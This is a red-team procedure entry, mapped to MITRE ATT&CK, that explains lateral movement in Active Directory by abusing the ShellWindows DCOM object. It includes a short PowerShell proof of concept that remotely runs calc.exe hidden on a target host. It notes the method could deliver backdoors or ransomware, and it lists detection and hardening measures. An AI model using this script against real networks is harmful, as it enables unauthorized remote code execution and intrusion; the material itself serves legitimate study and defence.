---
id: 64ee48bd-9b55-47a9-b00d-5b2b2830e211
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:07.190088+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/DCOM Exploitation]]'
  - '[[tags/DCOM via ShellBrowserWindow]]'
commands:
  - '[[commands/powershell-dcom-shellbrowserwindow-execute-calculator]]'
platforms:
  - Windows
tools: []
validated: true
---

# DCOM ShellBrowserWindow Calculator Execution

## Summary

This procedure demonstrates how to execute arbitrary code on a remote Windows system by abusing the ShellWindows DCOM object via PowerShell. It specifically launches the Windows Calculator (calc.exe) on the target as a proof-of-concept for remote code execution, enabling lateral movement in Active Directory environments where the attacker has domain user credentials.

## Description

DCOM (Distributed Component Object Model) via ShellBrowserWindow exploits the ShellWindows COM object (CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880) to invoke remote execution. The technique involves creating an instance of the object on the target machine over the network and using its ShellExecute method to run commands. This is particularly effective in domain-joined Windows environments (Windows 10 and later) for lateral movement after initial access, as it requires only authenticated domain user privileges and leverages RPC/DCOM protocols (typically over TCP port 135). The procedure can be adapted to execute more malicious payloads like backdoors or ransomware, but here it focuses on a benign calculator launch to verify execution without alerting defenses. Note that this does not work on Windows 7 due to the absence of the required COM object.

## Requirements

1. Authenticated access to a domain user account with network access to the target.
2. PowerShell execution policy allowing script runs (or bypass via -ExecutionPolicy).
3. Target must be a Windows 10+ machine joined to the domain.
4. Network connectivity to the target's RPC endpoint mapper (port 135) and dynamic DCOM ports (typically 49152-65535).

## Defense

- Disable unnecessary DCOM components via Group Policy or registry restrictions on the ShellWindows object.
- Implement network segmentation and firewall rules to block unauthorized RPC/DCOM traffic between hosts.
- Monitor for anomalous PowerShell executions and DCOM activations using Windows Event Logs (Event ID 10000-10016 in Microsoft-Windows-DCOM/Operational) or Sysmon (ProcessCreate with parent svchost.exe).
- Enable constrained delegation and audit DCOM calls via Object Access auditing.

## Objectives

1. Achieve remote code execution on a target Windows host via DCOM.
2. Demonstrate lateral movement capability in an Active Directory network.
3. Verify execution without requiring administrative privileges on the target.

## Instructions

### Step 1: Prepare and Execute DCOM Payload

**Context**: This step creates a remote instance of the ShellBrowserWindow COM object and uses it to execute calc.exe via cmd.exe. The CLSID targets the ShellWindows interface, and the ShellExecute method handles the command invocation. Replace the target IP with the actual remote host. This assumes execution from an attacker-controlled domain-joined machine.

**Command** ([[commands/powershell-dcom-shellbrowserwindow-execute-calculator]]):

Run the following PowerShell script, substituting the target IP:

```powershell
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"$_TARGET_IP")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

> This command retrieves the COM type using the fixed CLSID for ShellBrowserWindow, creates a remote instance bound to the target IP, and invokes ShellExecute to run calc.exe hidden via cmd.exe in the system32 directory. If successful, no output is returned to the console, but the calculator will appear on the target's desktop (if interactive session exists) or run silently. Verify by checking the target for the running process (tasklist | findstr calc) or observing user interaction.

**Expected Output**: Silent success with no console output; errors may include "Access Denied" if credentials lack permissions or "CLSID not found" if the target OS is incompatible.
